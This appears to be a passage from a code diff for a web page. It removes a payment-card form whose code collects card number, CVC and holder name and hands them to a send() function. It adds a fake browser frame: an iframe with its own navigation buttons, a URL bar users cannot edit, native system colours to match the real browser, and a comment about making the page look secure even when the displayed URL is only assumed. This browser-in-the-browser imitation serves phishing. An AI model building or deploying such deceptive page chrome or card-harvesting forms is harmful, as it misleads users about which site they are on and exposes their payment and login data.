+              // ignore
             } else {
-                wrapper.classList.add('success');
-                submitBtn.classList.add('success-pulse');
-                setTimeout(() => submitBtn.classList.remove('success-pulse'), 450);
-                setTimeout(() => { if(callback) callback(); }, 500);
+              // maybe same but sync display anyway
+              updateUrlBar(currentUrl);
             }
+          } catch (securityErr) {
+            // cross-origin: cannot read location, rely on known currentUrl and iframe src
+            // but we still can detect URL bar updates via load event if we compare referrer? skip.
+            updateUrlBar(currentUrl);
+          }
+        } else {
+          updateUrlBar(currentUrl);
         }
-        requestAnimationFrame(animate);
+      } catch (e) {
+        // fallback
+        updateUrlBar(currentUrl);
+      }
+      updateNavButtons();
+      isInternalNavigation = false;
+    }
+
+    // Update back/forward button states based on history index
+    function updateNavButtons() {
+      if (currentIndex <= 0) {
+        backBtn.classList.add('disabled');
+      } else {
+        backBtn.classList.remove('disabled');
+      }
+      
+      if (currentIndex >= historyStack.length - 1 || historyStack.length === 0) {
+        forwardBtn.classList.add('disabled');
+      } else {
+        forwardBtn.classList.remove('disabled');
+      }
+    }
+
+    // Back action
+    function goBack() {
+      if (currentIndex > 0) {
+        currentIndex--;
+        const prevUrl = historyStack[currentIndex];
+        if (prevUrl) {
+          isInternalNavigation = true;
+          iframe.src = prevUrl;
+          currentUrl = prevUrl;
+          updateUrlBar(prevUrl);
+        }
+        updateNavButtons();
+      }
+    }
+
+    // Forward action
+    function goForward() {
+      if (currentIndex < historyStack.length - 1) {
+        currentIndex++;
+        const nextUrl = historyStack[currentIndex];
+        if (nextUrl) {
+          isInternalNavigation = true;
+          iframe.src = nextUrl;
+          currentUrl = nextUrl;
+          updateUrlBar(nextUrl);
+        }
+        updateNavButtons();
+      }
+    }
+
+    // Refresh: reload current page
+    function refreshPage() {
+      if (iframe.src) {
+        // force reload by resetting src with a slight trickle? just set same src
+        const currentSrc = iframe.src;
+        isInternalNavigation = true;
+        iframe.src = currentSrc;
+        // also if contentWindow exists and reload method is available (works only same origin)
+        try {
+          if (iframe.contentWindow && iframe.contentWindow.location.reload) {
+            iframe.contentWindow.location.reload();
+          }
+        } catch(e) { /* cross-origin: reload using src reassign works anyway */ }
+      } else {
+        loadUrl(currentUrl, false);
+      }
+    }
+
+    // Initialize browser: set up default page, create initial history state
+    function initBrowser() {
+      // starting url
+      const start = DEFAULT_URL;
+      historyStack = [start];
+      currentIndex = 0;
+      currentUrl = start;
+      iframe.src = start;
+      updateUrlBar(start);
+      updateNavButtons();
+      
+      // Listen to iframe load events to track page changes (clicks on links etc)
+      iframe.addEventListener('load', () => {
+        // Delay to let potential redirects settle
+        setTimeout(() => {
+          // try to get actual location after load
+          try {
+            if (iframe.contentWindow && iframe.contentWindow.location) {
+              const newUrl = iframe.contentWindow.location.href;
+              if (newUrl && newUrl !== 'about:blank' && newUrl !== currentUrl) {
+                if (!isInternalNavigation) {
+                  // detect external navigation inside iframe
+                  currentUrl = newUrl;
+                  updateUrlBar(currentUrl);
+                  // add to history if not the last item
+                  if (historyStack[currentIndex] !== currentUrl) {
+                    if (currentIndex < historyStack.length - 1) {
+                      historyStack = historyStack.slice(0, currentIndex + 1);
+                    }
+                    historyStack.push(currentUrl);
+                    currentIndex = historyStack.length - 1;
+                    updateNavButtons();
+                  }
+                } else {
+                  currentUrl = newUrl;
+                  updateUrlBar(currentUrl);
+                  if (historyStack[currentIndex] !== currentUrl) {
+                    historyStack[currentIndex] = currentUrl;
+                  }
+                  isInternalNavigation = false;
+                }
+              } else {
+                updateUrlBar(currentUrl);
+              }
+            } else {
+              updateUrlBar(currentUrl);
+            }
+          } catch (crossErr) {
+            // cross-domain: get src from iframe? but if page redirected, src unchanged-- just maintain currentUrl as best.
+            // We'll assume current url from last navigation is okay, but we can show it's secure.
+            updateUrlBar(currentUrl);
+          }
+          updateNavButtons();
+          isInternalNavigation = false;
+        }, 50);
+      });
+      
+      // solve potential failure: on error still update bar
+      iframe.addEventListener('error', () => {
+        updateUrlBar(currentUrl);
+        updateNavButtons();
+      });
     }
     
-    function process() {
-        if(processing) return;
-        if(!validateForm()) {
-            return;
-        }
-        processing = true;
-        let cardData = get();
-        send(cardData);
-        startButtonAnimation(() => { done(); });
-    }
+    // Attach event handlers
+    backBtn.addEventListener('click', goBack);
+    forwardBtn.addEventListener('click', goForward);
+    refreshBtn.addEventListener('click', refreshPage);
     
-    function refresh(){ location.reload(); }
+    // additional: just to make sure the url bar is fully selectable, non-editable but we removed contenteditable.
+    // we want that users cannot edit the url: it's a div with text only. no input.
+    // double click allowed but not modifiable.
+    urlDisplaySpan.setAttribute('contenteditable', 'false');
+    // remove any text selection override but it's fine.
     
-    submitBtn.addEventListener('click', function(e) { e.preventDefault(); process(); });
-    document.getElementById('action-cancel').addEventListener('click', function(e) { e.preventDefault(); refresh(); });
+    // Start everything
+    initBrowser();
+
+    // Watch system theme changes: no need to force custom because we use CSS prefers-color-scheme & Canvas, ButtonFace.
+    // ensures the topbar matches native browser exactly for each user's OS theme.
+    // also any resizing: full viewport works.
+    // Additional security / sandbox: we set iframe sandbox to allow necessary features for modern sites (including scripts, forms)
+    // we also ensure popups, top navigation etc controlled. but we expect full user experience.
     
-    // clear errors on input
-    let inputs = ['input-card-number', 'card-expires', 'input-card-cvc', 'input-card-holder'];
-    inputs.forEach(id => {
-        let el = document.getElementById(id);
-        if(el) {
-            el.addEventListener('input', function() {
-                this.classList.remove('error');
-                let errId = '';
-                if(id === 'input-card-number') errId = 'card-number-error';
-                else if(id === 'card-expires') errId = 'expiry-error';
-                else if(id === 'input-card-cvc') errId = 'cvv-error';
-                else if(id === 'input-card-holder') errId = 'holder-error';
-                if(errId) document.getElementById(errId).style.display = 'none';
-            });
-        }
+    // final polish: we also want to ensure that forward/back usage after many redirects integrity
+    window.addEventListener('load', () => {
+      // ensure system colors applied again
+      document.body.style.backgroundColor = 'Canvas';
     });
-    
-    // card number formatting
-    let ci = document.getElementById('input-card-number');
-    ci.addEventListener('input', function(){
-        let v = this.value.replace(/\s/g,'').replace(/[^0-9]/g,''), f='';
-        for(let i=0;i<v.length;i++){ if(i>0 && i%4===0) f+=' '; f+=v[i]; }
-        this.value = f;
-    });
-    // expiry formatting
-    let ei = document.getElementById('card-expires');
-    ei.addEventListener('input', function(){
-        let r = this.value.replace(/\D/g,'');
-        if(r.length >= 4) this.value = r.slice(0,2)+'/'+r.slice(2,4);
-        else if(r.length === 2) this.value = r;
-        else this.value = r;
-    });
-})();
+  })();
 </script>
 </body>
 </html>
